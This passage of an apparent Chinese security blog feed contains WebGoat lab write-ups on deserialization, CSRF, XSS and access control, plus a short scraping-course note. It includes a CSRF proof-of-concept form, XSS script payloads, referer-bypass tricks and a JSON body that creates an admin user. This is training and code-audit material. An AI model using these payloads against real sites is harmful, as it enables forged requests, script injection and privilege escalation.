java.io.ObjectInputStream;public class UnserializationTest &#123;    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));        Object object = objectInputStream.readObject();        return object;    &#125;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        Person person = (Person) unserialize(&quot;ser.bin&quot;);        System.out.println(&quot;unserialize&quot;+person);    &#125;&#125;</code></pre><p>这里也可以提前创建个空person对象来接收反序列化后的person对象</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127151513258.png" alt="image-20231127151513258"></p><h1 id="Webgoat-反序列化"><a href="#Webgoat-反序列化" class="headerlink" title="Webgoat 反序列化"></a>Webgoat 反序列化</h1><p>这道题一直不成功，但还是审计一下：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163148626.png" alt="image-20231127163148626"></p><p>首先对传入的字符串进行解码，然后进行反序列化，用o接受反序列化之后的对象，最后判断是否为VulnerableTaskHolder的实例</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163335284.png" alt="image-20231127163335284"></p><p>最下面是判断执行时间是否在3到7秒</p><p>我们再看一看这个危险类：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163555555.png" alt="image-20231127163555555"></p><p>这里和例题一样，使用taskAction来rce</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127163838608.png" alt="image-20231127163838608"></p><p>从自定义的序列化过程来看，对象必须是十分钟之内创建的，然后rce必须以ping或者sleep开头</p><p>payload应该是这样：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127165418906.png" alt="image-20231127165418906"></p><p>但是根据回显在时间判断出了点问题，后来想起来在之前做题的时候发现docker的时间和我的系统时间是对不上的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;给java反序列化上个引子，顺带把webgoat代码审计结束了&lt;/p&gt;
&lt;p&gt;本来要开始学链子了，但是网警和技侦要开始考试了，打算突击一下c</summary>
      
    
    
    
    
    <category term="java" scheme="https://taninluv.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>爬虫</title>
    <link href="https://taninluv.github.io/2023/11/26/%E7%88%AC%E8%99%AB/"/>
    <id>https://taninluv.github.io/2023/11/26/%E7%88%AC%E8%99%AB/</id>
    <published>2023-11-26T06:54:21.000Z</published>
    <updated>2023-11-26T07:35:41.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>这是大数据隐私保护课程的实验-自动化新闻采集，只是简单的实验和记录，不作深入研究</p><h1 id="反爬虫机制"><a href="#反爬虫机制" class="headerlink" title="反爬虫机制"></a>反爬虫机制</h1><ul><li>robots.txt</li><li>IP封锁和频率限制</li><li>验证码</li><li>User-Agent检测</li><li>动态内容生成</li><li>Honypot技术</li><li>反反爬虫技术</li></ul><h1 id="rss"><a href="#rss" class="headerlink" title="rss"></a>rss</h1><p>谷歌新闻提供的rss，也就是xml的数据非常方便于信息采集：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231126151612390.png" alt="image-20231126151612390"></p><p>半结构化的数据，但是谷歌有被反爬的风险</p><h1 id="百度新闻"><a href="#百度新闻" class="headerlink" title="百度新闻"></a>百度新闻</h1><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231126152110282.png" alt="image-20231126152110282"></p><p><a href="https://www.baidu.com/s?rtt=1&bsst=1&cl=2&tn=news&ie=utf-8&word=%E6%BB%91%E5%9D%A1">https://www.baidu.com/s?rtt=1&amp;bsst=1&amp;cl=2&amp;tn=news&amp;ie=utf-8&amp;word=%E6%BB%91%E5%9D%A1</a></p><p>这里我们关注一下url的传参：</p><ul><li><p>rtt</p></li><li><p>bsst</p></li><li><p>cl</p></li><li><p>tn</p></li><li><p>ie</p></li><li><p>word</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231126153106262.png" alt="image-20231126153106262"></p></li></ul><p>找到返回的报文观察我们需要爬取的字段特征</p><h1 id="beautifulsoup"><a href="#beautifulsoup" class="headerlink" title="beautifulsoup"></a>beautifulsoup</h1><p>from bs4 import BeautifulSoup</p><p><a href="https://zhuanlan.zhihu.com/p/128484144">https://zhuanlan.zhihu.com/p/128484144</a></p><p>解析-筛选-</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概要&quot;&gt;&lt;a href=&quot;#概要&quot; class=&quot;headerlink&quot; title=&quot;概要&quot;&gt;&lt;/a&gt;概要&lt;/h1&gt;&lt;p&gt;这是大数据隐私保护课程的实验-自动化新闻采集，只是简单的实验和记录，不作深入研究&lt;/p&gt;
&lt;h1 id=&quot;反爬虫机制&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    
    <category term="爬虫" scheme="https://taninluv.github.io/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-CSRF</title>
    <link href="https://taninluv.github.io/2023/11/24/WebGoat-CSRF/"/>
    <id>https://taninluv.github.io/2023/11/24/WebGoat-CSRF/</id>
    <published>2023-11-24T09:21:39.000Z</published>
    <updated>2023-11-25T08:20:23.020Z</updated>
    
    <content type="html"><![CDATA[<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>这题模拟一个简单的csrf，从外源触发这个表单就可以得到flag：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619320.png" alt="image-20231125141114780"></p><p>抓包，然后使用插件制作一个payload，简单看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619321.png" alt="image-20231125141428817"></p><p>相当于创建了一个表单，然后让他生成相同内容的请求包，但是这个表单显然比较初级，可以加入一些自动触发的dom事件在打开链接时自动触发提交表单，这里主要做代码审计，故不多做演示</p><p>打开burp pro比较麻烦，这里直接复制源码的表单元素，然后放到wolf触发：</p><pre><code>&lt;form accept-charset=&quot;UNKNOWN&quot; id=&quot;basic-csrf-get&quot; method=&quot;POST&quot; name=&quot;form1&quot; target=&quot;_blank&quot; successcallback=&quot;&quot; action=&quot;/WebGoat/csrf/basic-get-flag&quot;&gt;        &lt;input name=&quot;csrf&quot; type=&quot;hidden&quot; value=&quot;false&quot;&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619323.png" alt="image-20231125142631045"></p><p>点击提交即可</p><p>进入源码审计：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619324.png" alt="image-20231125143654426"></p><p>这里我们先跳过第一个判断，因为从我们抓到的包来看，我们的referer包头不为null。</p><p>当refererArr[2]不等于host的时候，我们进入else块，此时我们能拿到flag，修改包试一试：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619325.png" alt="image-20231125144000683"></p><p>把8080端口改为8081，发现返回了flag</p><p>再回到源码，我们看到当referer为null的时候也可以success：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619326.png" alt="image-20231125144323608"></p><p>进入这个控制块好像无论如何都会success：</p><p>删除referer：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619327.png" alt="image-20231125144525087"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619328.png" alt="image-20231125144506097"></p><p>此时csrf为true还是false或者其他值都无关紧要</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619329.png" alt="image-20231125144634807"></p><p>但是这里有个问题时既然要不同源，为何检查referer而不是origin，挺奇怪的</p><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>这里让代表当前登录的用户触发评论提交。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619330.png" alt="image-20231125145329540"></p><p>这里的解法和上题差不多，我们看看源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619331.png" alt="image-20231125150302262"></p><p>这里的逻辑和上题大差不差，这里看看这个<code>weakAntiCSRF</code>:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619332.png" alt="image-20231125150355356"></p><p>我们发现这个令牌是静态的</p><p>而且最后的评论：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619333.png" alt="image-20231125152348104"></p><p>依然是我发起的，显而易见这个静态的token标记了我的身份，这里简单搜索了一下csrf token：</p><p><a href="https://blog.csdn.net/yexudengzhidao/article/details/93527586">CSRF防御之token认证_csrf token-CSDN博客</a></p><blockquote><p>CSRF Token的防护策略分为三个步骤：</p><p>将CSRF Token输出到页面中</p><p>首先，用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。因此，为了安全起见Token最好还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。</p><p>页面提交的请求携带这个Token</p><p>对于GET请求，Token将附在请求地址之后，这样URL 就变成 <a href="http://url/?csrftoken=tokenvalue%E3%80%82">http://url?csrftoken=tokenvalue。</a> 而对于 POST 请求来说，要在 form 的最后加上：</p>  <input type="hidden" name="csrftoken" value="tokenvalue"/>1这样，就把Token以参数的形式加入请求了。<p>服务器验证Token是否正确<br>当用户从客户端得到了Token，再次提交给服务器的时候，服务器需要判断Token的有效性，验证过程是先解密Token，对比加密字符串以及时间戳，如果加密字符串一致且时间未过期，那么这个Token就是有效的。<br>总结：<br>Token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄露Token，那么接口的CSRF攻击就无法成功。</p></blockquote><h1 id="7"><a href="#7" class="headerlink" title="7"></a>7</h1><p>这道题跟前面的有些区别，就是在提交表单时，name和value之间会自动填充一个 <code>=</code>，这道题要上传一段json数据，此时我们需要处理这个<code>=</code>，因为我们上传的数据全都在json中：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619334.png" alt="image-20231125155326738"></p><p>此时我们并不需要<code>=</code>，解决办法是把这个<code>=</code>放在无关紧要的数据中，比如这里的message：</p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;form action=&quot;http://172.20.10.3:8080/WebGoat/csrf/feedback/message&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;&amp;#123;&amp;quot;name&amp;quot;&amp;#58;&amp;quot;webgoat&amp;quot;&amp;#44;&amp;quot;email&amp;quot;&amp;#58;&amp;quot;webgoat&amp;#64;webgoat&amp;#46;org&amp;quot;&amp;#44;&amp;#13;&amp;#10;&amp;quot;subject&amp;quot;&amp;#58;&amp;quot;suggestions&amp;quot;&amp;#44;&amp;quot;message&amp;quot;&amp;#58;&amp;quot;&quot; value=&quot;WebGoat&amp;#32;is&amp;#32;the&amp;#32;best&amp;#33;&amp;#33;&amp;quot;&amp;#125;&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>让name&#x3D;<code>&#123;&quot;name&quot;:&quot;webgoat&quot;,&quot;email&quot;:&quot;webgoat@webgoat.org&quot;, &quot;subject&quot;:&quot;suggestions&quot;,&quot;message&quot;:&quot;</code></p><p>value&#x3D;<code>WebGoat is the best!!&quot;</code></p><p>拼接后，name字段中末尾多出的<code>&quot;</code>和value中的闭合，就有了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619335.png" alt="image-20231125155921749"></p><p>实际上是<code>&#123;&quot;name&quot;:&quot;webgoat&quot;,&quot;email&quot;:&quot;webgoat@webgoat.org&quot;, &quot;subject&quot;:&quot;suggestions&quot;,&quot;message&quot;:&quot;</code>&#x3D;<code>WebGoat is the best!!&quot;</code></p><p>除了构造上的区别，其他跟之前一样</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619336.png" alt="image-20231125160046102"></p><p>看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619337.png" alt="image-20231125160356976"></p><p>contenttype需要修改，host和referer不同</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619338.png" alt="image-20231125160536993"></p><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><p>这道题挺迷惑的，看了一下别人的解释：</p><p><a href="https://www.freebuf.com/column/221947.html">历史最全 WebGoat 8.0 通关攻略 - FreeBuf网络安全行业门户</a></p><blockquote><h4 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h4><p>这一题按照题目要求，注册个csrf-开头的用户，比如我的用户名为tntaxin，然后我再注册一个csrf-tntaxin,然后登录csrf-tntaxin访问这道题目，点击solved就过了，当然这题的真实目的是希望你构建一个csrf 恶意链接，然后访问这个链接就会自动登录csrf-tntaxin这个账户，这样受害者的访问记录你就都知道了。</p></blockquote><p>也就是说别人不知道登录了我们的账户，我们从历史记录里面可以盗取别人的访问记录</p><p>源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251619339.png" alt="image-20231125161832665"></p><p>当一个以csrf-xxx为用户名的用户登录后，会给xxx用户标记为成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;3&quot;&gt;&lt;a href=&quot;#3&quot; class=&quot;headerlink&quot; title=&quot;3&quot;&gt;&lt;/a&gt;3&lt;/h1&gt;&lt;p&gt;这题模拟一个简单的csrf，从外源触发这个表单就可以得到flag：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubuserc</summary>
      
    
    
    
    
    <category term="WebGoat" scheme="https://taninluv.github.io/tags/WebGoat/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="CSRF" scheme="https://taninluv.github.io/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-XSS</title>
    <link href="https://taninluv.github.io/2023/11/24/WebGoat-XSS/"/>
    <id>https://taninluv.github.io/2023/11/24/WebGoat-XSS/</id>
    <published>2023-11-24T02:40:16.000Z</published>
    <updated>2023-11-25T06:12:20.814Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-7"><a href="#xss-7" class="headerlink" title="xss-7"></a>xss-7</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411125.png" alt="image-20231124110348679"></p><p>这里直接点击购买看一下有哪些数据可以回显，然后发现是card number，然后在card number这个输入框注入代码:</p><pre><code>&lt;scrpt&gt;alert(&#39;xxx&#39;)&lt;/scrpt&gt;or&lt;scrpt&gt;console.log(&#39;xxx&#39;)&lt;/scrpt&gt;</code></pre><p>源码部分：</p><p><a href="https://blog.csdn.net/zhuying123jl/article/details/120846994">Java Pattern compile(String)用法及代码示例_pattern.compile_yinger553的博客-CSDN博客</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411126.png" alt="image-20231124143843279"></p><p>写了一个正则匹配</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411127.png" alt="image-20231124144119278"></p><p>这里我们可以看到field1也就是card number我们是可以控制的，并且只是简单的拼接没有经过过滤，而这里根据前后文来看他有一些html标签，说明前端会解析我们的字符串，我们必定是可以进行xss注入的</p><h1 id="Reflected-and-DOM-Based-XSS"><a href="#Reflected-and-DOM-Based-XSS" class="headerlink" title="Reflected and DOM-Based XSS"></a>Reflected and DOM-Based XSS</h1><blockquote><p>反射式和基于DOM的XSS 基于DOM的XSS是反射XSS的另一种形式。两者都是通过发送带有反映到浏览器的输入的链接来触发的。DOM和“传统”反射XSS之间的区别在于，使用DOM，负载永远不会到达服务器。它将只由客户端处理。 攻击者向受害者发送恶意URL 受害者点击链接 该链接可能加载恶意网页或他们使用的（已登录？）具有易受攻击的路由&#x2F;处理程序的网页 如果是恶意网页，它可能会使用自己的JavaScript使用易受攻击的路由&#x2F;处理程序攻击另一个页面&#x2F;url 易受攻击的页面在该页面&#x2F;站点上呈现负载并在用户上下文中执行攻击 攻击者的恶意脚本可能使用本地帐户的权限运行命令 受害者没有意识到袭击发生了… 恶意攻击者不使用＜script＞alert（“xss”）&lt;&#x2F;script＞</p></blockquote><p>结合第八页：</p><blockquote><p>您应该能够使用上一个示例执行脚本。不过，在这一点上，它将被视为“self-XSS”。 为什么？ 这是因为没有任何链接会触发XSS</p></blockquote><p>反射性xss和dom型的xss的区别可能在于，反射型只能在本地自己触发，无法通过url发送给其他人让别人触发，我们先往下看一看dom xss：</p><h1 id="XSS-10"><a href="#XSS-10" class="headerlink" title="XSS-10"></a>XSS-10</h1><p>寻找在生产期间保留在应用程序中的测试代码的路由：</p><p>元素中检索route，发现只有一个：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411128.png" alt="image-20231124150020482"></p><p>按照路径到源代码中审计一下这个js文件：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411130.png" alt="image-20231124150117809"></p><p>找到了这个测试路由的片段，继续跟进一下这个方法：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411131.png" alt="image-20231124150718492"></p><p>&#x3D;》</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411132.png" alt="image-20231124150854700"></p><p>这里大概意思是查找一个.lesson-content的DOM元素，然后把html内容改为“test”+param，这里param显然是可以构造xss的</p><p>ok，那怎么传入参数呢？我们回到最开始的路由文件：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411133.png" alt="image-20231124152028792"></p><blockquote><ul><li><code>&#39;lesson/:name&#39;</code>: 当访问 <code>lesson/</code> 后接一个动态的 <code>name</code> 参数时，将触发 <code>lessonRoute</code> 方法。</li><li><code>&#39;lesson/:name/:pageNum&#39;</code>: 当访问 <code>lesson/</code> 后接一个动态的 <code>name</code> 参数和 <code>pageNum</code> 参数时，将触发 <code>lessonPageRoute</code> 方法。</li><li><code>&#39;test/:param&#39;</code>: 当访问 <code>test/</code> 后接一个动态的 <code>param</code> 参数时，将触发 <code>testRoute</code> 方法。</li></ul><p>这些路由规则中使用了冒号 <code>:</code> 定义了动态的 URL 参数部分，例如 <code>:name</code>、<code>:pageNum</code>、<code>:param</code>。当访问这些对应的 URL 时，这些参数会被传递给对应的路由处理函数。</p></blockquote><p>我们如何访问到对应的url呢？</p><p>看一下题目：</p><blockquote><p>对于本例，您将希望在路由处理程序中查找一些“测试”代码（WebGoat使用主干作为其主要JavaScript库）。有时，测试代码会留在生产中（而且测试代码通常非常简单，缺乏安全性或任何质量控制！）。 你的目标是找到路线并加以利用。不过，首先… 基本路线是什么？例如，请查看本课的URL…它应该看起来像&#x2F;WebGoat&#x2F;start.mvc#classic&#x2F;CrosSiteScripting.lesson&#x2F;9。本例中的“基本路由”是：start.mvc#classic&#x2F;   之后CrossSiteScripting.lesson&#x2F;9是由JavaScript路由处理程序处理的参数。 那么，在生产过程中留在应用程序中的测试代码的路径是什么呢？要回答这个问题，您必须检查JavaScript源代码。</p></blockquote><p>我们看到，start.mvc#classic&#x2F;是一个基本路由,这里先补充一下GPT的解释：</p><blockquote><p>在这个URL中：</p><ul><li><code>start.mvc</code> 可能是一个处理页面路由的 MVC（Model-View-Controller）模式中的控制器或者路由。</li><li><code>classic/CrosSiteScripting.lesson/9</code> 是哈希部分，可能是传递给控制器或路由的参数。</li></ul><p>通常情况下，URL中的哈希部分（#classic&#x2F;CrosSiteScripting.lesson&#x2F;9）通常用于前端路由，这意味着这个URL可能由前端 JavaScript 根据路由规则进行处理。</p><p>在常见的前端框架中，哈希部分被用于单页应用程序（SPA）中的路由处理。它允许前端应用程序根据哈希部分来确定显示的内容，而不会重新加载整个页面。在这种情况下，路由可能被设置为解析哈希部分并根据不同的路由规则显示不同的内容或触发不同的操作。</p><p>在你提供的URL中，可能存在一个名为<code>start.mvc</code>的控制器或路由，它根据哈希部分（<code>#classic/CrosSiteScripting.lesson/9</code>）来确定要显示或执行的内容。具体的路由处理方式和逻辑取决于应用程序的实现和使用的前端框架。</p></blockquote><p>也就是说前端js也对url 进行了路由解析和处理，这可能也是为什么我们前端访问的结构和源码审计里面的结构有所差异了，那这里的测试路由应该就是start.mvc#test了。</p><p>我们访问一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411134.png" alt="image-20231124153354605"></p><p>页面似乎没有发生变化，但是我们应该可以传入参数了：</p><h2 id="（坑）"><a href="#（坑）" class="headerlink" title="（坑）"></a>（坑）</h2><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>&#x3D;&gt;</p><pre><code>%3Cscript%3Ealert(1)%3C/script%3E</code></pre><p>但是这里访问之后并没有反应，</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411135.png" alt="image-20231124154953590"></p><p>看起来我们的分析应该是没有问题的</p><p>后端也没什么好看，主要是这里好像和后端也没啥关系：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411136.png" alt="image-20231124155056841"></p><p>突然发现：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411137.png" alt="image-20231124155626026"></p><p>如果正常情况下：<img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411138.png" alt="image-20231124155731764"></p><p>看起来我们输入标签之后，它并没有进入危险函数，最后看了后面一题的源码后：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411139.png" alt="image-20231124162920056"></p><p>原来时cyberchef在url加密的时候没有编码 <code>/</code>导致的不成功，要把<img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411140.png" alt="image-20231124163059886"></p><p>编码所有特殊字符勾选上</p><h1 id="xss-11"><a href="#xss-11" class="headerlink" title="xss-11"></a>xss-11</h1><p>这里让我们触发webgoat.customjs.phoneHome（），然后在控制台拿到相应的代码并提交，上一题都做出来了这里也就随便搞了：</p><p>但是这里挺有意思的，发现<code>&lt;script&gt;</code>标签可以不用闭合</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311251411141.png" alt="image-20231124163249722"></p><p>挺奇怪的，找了半天没有找到依据。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-7&quot;&gt;&lt;a href=&quot;#xss-7&quot; class=&quot;headerlink&quot; title=&quot;xss-7&quot;&gt;&lt;/a&gt;xss-7&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Taninluv/PICLI</summary>
      
    
    
    
    
    <category term="WebGoat" scheme="https://taninluv.github.io/tags/WebGoat/"/>
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="XSS" scheme="https://taninluv.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat-Broken Access Control</title>
    <link href="https://taninluv.github.io/2023/11/23/Broken-Access-Control/"/>
    <id>https://taninluv.github.io/2023/11/23/Broken-Access-Control/</id>
    <published>2023-11-23T07:33:49.000Z</published>
    <updated>2023-11-26T03:26:39.097Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDOR-2"><a href="#IDOR-2" class="headerlink" title="IDOR-2"></a>IDOR-2</h1><blockquote><p>许多访问控制问题容易受到经过身份验证但未经授权的用户的攻击。因此，让我们从合法身份验证开始。然后，我们将寻找绕过或滥用授权的方法。</p></blockquote><p>这里只是输入tom或者cat进行登录，进入下一题进行IDOR审查</p><h1 id="IDOR-3"><a href="#IDOR-3" class="headerlink" title="IDOR-3"></a>IDOR-3</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126523.png" alt="image-20231123154028096"></p><p>抓包看一看没有显示的属性</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126525.png" alt="image-20231123154145613"></p><p>看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126526.png" alt="image-20231123155050326"></p><p>我们发现他把不相关的信息一并返回了，实际 用的信息只有其中三个，而关于判定答案部分：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126527.png" alt="image-20231123155217458"></p><p>以<code>，</code>为分隔，检测答案是否为userid和role</p><h1 id="IDOR-4"><a href="#IDOR-4" class="headerlink" title="IDOR-4"></a>IDOR-4</h1><p>在另一个接口查看自己的profile</p><p>根据描述：</p><blockquote><p>就概要文件而言，我们正在使用的应用程序似乎遵循RESTful模式。许多应用程序都具有提升用户可以访问另一用户内容的角色。在这种情况下，just&#x2F;profile将不起作用，因为自己用户的会话&#x2F;身份验证数据不会告诉我们他们想要查看谁的配置文件。那么，您认为使用直接对象引用显式查看您自己的配置文件的可能模式是什么？</p></blockquote><p>这样的话想起之前我们得到了自己的userid，这里应该是通过userid确定我们需要查看的概要文件，这样的模式在实际情况中也很常见</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126528.png" alt="image-20231123160321880"></p><p>看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126529.png" alt="image-20231123160435656"></p><p>他这里对userid其实没有添加更多的验证和防护，很大程度上我们可以通过爆破或者猜测或者其他方法得到别人的userid就可以得到别人的profile信息</p><h1 id="IDOR-5"><a href="#IDOR-5" class="headerlink" title="IDOR-5"></a>IDOR-5</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126530.png" alt="image-20231123163038524"></p><p>这里访问别人的profile，爆破一下，跟之前说的一样，这里主要做代码审计，就不爆破了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126531.png" alt="image-20231123163321558"></p><p>这个板块的源码给我的感觉有一点刻意了，这里第二个if就该截断才对，可能是单纯为了让我们感受一下吧…</p><h1 id="Missing-Function-Level-Access-Control"><a href="#Missing-Function-Level-Access-Control" class="headerlink" title="Missing Function Level Access Control"></a>Missing Function Level Access Control</h1><p>缺少功能级别访问控制</p><blockquote><p>事实上，许多人（包括本课的作者）会将功能级别的访问控制和IDOR归入“访问控制”。为了OWASP，前10名和这些教训，我们将进行区分。大多数人的区别在于，IDOR更多的是一个“水平”或“横向”访问控制问题，而缺少功能级别的访问控制“暴露了功能”。尽管这里的IDOR课程演示了功能是如何公开的（至少对同一角色的另一个用户），但我们将研究功能公开的其他方式。</p></blockquote><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126532.png" alt="image-20231123163858625"></p><p>在这里找到两个隐藏的表单</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126534.png" alt="image-20231123165225364"></p><p>个人感觉不是很好找这种表单，尤其是在页面元素很多的时候，这道题大概猜测在Accout板块或者Messages板块。其实也看得眼花。。</p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>根据题目，我们可以利用上提找到的信息，也就是两个接口，访问一下&#x2F;users：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126535.png" alt="image-20231123172002806"></p><p>返回500，有点夸张，看一下源码：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126536.png" alt="image-20231123173705160"></p><p>看来要设置Content-Type,这里的GET请求方法的视图函数返回了所有user</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126537.png" alt="image-20231123172546905"></p><p>挺离谱的，好像意料之外又情理之中</p><p>看一下hint里的复杂思路：</p><p>If the request to view users, were a ‘service’ or ‘RESTful’ endpoint, what would be different about it?</p><p>You will want to add WEBGOAT_ADMIN for the user’s role. Yes, you’d have to guess&#x2F;fuzz this in a real-world setting.</p><p>OK, here it is. First, create an admin user … Change the method to POST, change the content-type to “application&#x2F;json”. And your payload should look something like: {“username”:”newUser2”,”password”:”newUser12”,”matchingPassword”:”newUser12”,”role”:”WEBGOAT_ADMIN”}</p><p>也就是用post新创建一个admin用户，但是需要post的数据又是需要猜测一下的，按照hint就是需要猜测或者fuzz一下。看看源码怎么回事：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126538.png" alt="image-20231123174112906"></p><ul><li><code>consumes = &quot;application/json&quot;</code>：表示这个方法处理的请求内容类型是JSON格式。</li><li><code>produces = &quot;application/json&quot;</code>：表示这个方法返回的响应内容类型是JSON格式。</li></ul><p>这里看起来user类把RequestBody数据进行了一个类型转换然后保存新生成的user，那么只要知道user类有哪些属性就可以新建一个user对象，而user的属性按照我们之前的到的信息似乎只能创建一个普通用户：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126539.png" alt="image-20231123175903217"></p><p>但是到了这里，是不是发现了另一个IDOR？也就是这个role：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311261126540.png" 